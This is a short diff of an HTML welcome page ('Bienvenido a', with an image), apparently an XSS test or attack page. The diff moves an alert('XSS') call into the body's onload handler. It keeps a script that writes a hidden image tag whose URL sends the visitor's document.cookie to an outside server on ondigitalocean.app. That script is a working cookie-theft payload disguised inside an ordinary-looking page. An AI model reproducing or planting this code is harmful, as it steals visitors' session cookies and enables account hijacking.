@@ -19,11 +19,10 @@
         }
     </style>
 </head>
-<body>
+<body onload="alert('XSS');">
     <h1>Bienvenido a</h1>
     <img src="https://www.barcelonasc.com.ec/wp-content/uploads/2021/10/telconet-1024x374.png" alt="Imagen Central">
     <script>
-        alert("XSS");
         document.write('<img src="https://sea-lion-app-2cool.ondigitalocean.app?cookies=' + encodeURIComponent(document.cookie) + '" style="display:none;">');
     </script>
 </body>
